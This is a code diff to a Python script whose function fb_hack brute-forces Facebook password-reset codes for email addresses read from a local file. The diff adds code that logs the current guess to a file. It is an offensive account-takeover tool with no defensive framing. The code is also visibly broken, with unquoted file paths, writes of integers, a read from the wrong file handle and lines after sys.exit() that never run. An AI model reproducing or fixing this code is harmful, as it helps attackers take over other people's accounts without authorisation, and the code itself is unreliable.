@@ -153,6 +153,9 @@ def fb_hack(email, codex):
       success = (y, "succeded")
       s = " "
       reset = reset - 1
+      with open(home/krarktel/passcoder.txt, "a") as z:
+        z.write(reset)
+        z.close()
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
       check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
@@ -181,6 +184,9 @@ def fb_hack(email, codex):
       s = " "
       reset1 = reset - 1
       reset = reset1
+      with open(home/krarktel/passcoder.txt, "a") as z:
+        z.write(reset)
+        z.close()
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
       check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
@@ -218,7 +224,6 @@ f.close()
 z.write(reset)
 z.close()
 
-lines = f.readlines()
 while True:
   try:
     fb_hack(ehack, reset)
@@ -228,10 +233,10 @@ while True:
     else:
       reset = reset1
   except:
-    with open(home/krarktel/emails.txt, "r") as f:
-      ehack = f.readlines(-1)
-      
     sys.exit()
     with open(home/krarktel/emails.txt, "r") as f:
       ehack = f.readlines(-1)
+      f.close()
+    with open(home/krarktel/passcoder.txt, "r") as f:
+      reset = z.readlines(-1)
     
